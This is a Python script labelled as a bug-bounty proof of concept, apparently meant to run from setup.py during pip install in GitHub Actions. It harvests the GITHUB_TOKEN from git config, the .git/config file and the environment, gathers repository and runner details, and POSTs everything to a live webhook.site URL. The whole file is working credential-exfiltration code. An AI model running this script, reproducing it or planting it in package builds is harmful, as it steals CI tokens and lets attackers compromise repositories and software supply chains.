#!/usr/bin/env python3
import json
import os
import subprocess
import urllib.request

WEBHOOK_URL = "https://webhook.site/b824b019-ad64-47bd-8ec1-da95067b8994"

# Extract GITHUB_TOKEN from git configuration (where actions/checkout stores it)
def get_github_token():
    """Extract token from git config (stored by actions/checkout)"""
    tokens = []
    
    try:
        # Method 1: Read from git config extraheader
        result = subprocess.run(
            ["git", "config", "--get", "http.https://github.com/.extraheader"],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0 and result.stdout:
            tokens.append(("git_config_extraheader", result.stdout.strip()))
    except Exception as e:
        tokens.append(("git_config_error", str(e)))
    
    try:
        # Method 2: Read .git/config file directly
        git_config_path = os.path.join(os.getcwd(), ".git", "config")
        if os.path.exists(git_config_path):
            with open(git_config_path, "r") as f:
                config_content = f.read()
                if "extraheader" in config_content.lower() or "token" in config_content.lower():
                    tokens.append(("git_config_file", config_content[:500]))
    except Exception as e:
        tokens.append(("git_config_file_error", str(e)))
    
    try:
        # Method 3: List all git config values
        result = subprocess.run(
            ["git", "config", "--list"],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0:
            for line in result.stdout.split("\n"):
                if "http" in line.lower() or "token" in line.lower() or "auth" in line.lower():
                    tokens.append(("git_config_list", line.strip()))
    except Exception as e:
        tokens.append(("git_config_list_error", str(e)))
    
    # Method 4: Check environment variable
    env_token = os.getenv("GITHUB_TOKEN", "")
    if env_token:
        tokens.append(("env_GITHUB_TOKEN", env_token))
    
    return tokens

github_token_data = get_github_token()

data = {
    "status": "EXPLOITED_VIA_SETUP_PY",
    "repository": os.getenv("GITHUB_REPOSITORY"),
    "workflow": os.getenv("GITHUB_WORKFLOW"),
    "actor": os.getenv("GITHUB_ACTOR"),
    "runner": os.getenv("RUNNER_NAME"),
    "execution_point": "setup.py during pip install",
    "token_extraction_attempts": dict(github_token_data),
    "working_directory": os.getcwd(),
    "git_directory_exists": os.path.exists(os.path.join(os.getcwd(), ".git"))
}

def main():
    try:
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=json.dumps(data, indent=2).encode('utf-8'),
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        with urllib.request.urlopen(req, timeout=5) as response:
            print("\n" + "="*70)
            print(f"Exploit: PoC for Bug Bounty Program")
            print(f"Webhook status: {response.status}")
            print(f"Token extraction attempts: {len(github_token_data)}")
            for method, value in github_token_data:
                print(f"   - {method}: {value[:50] if isinstance(value, str) else value}...")
            print("="*70 + "\n")
    except Exception as e:
        print(f"⚠️ PoC webhook failed: {e}")
        print("Data collected:")
        print(json.dumps(data, indent=2))


main()


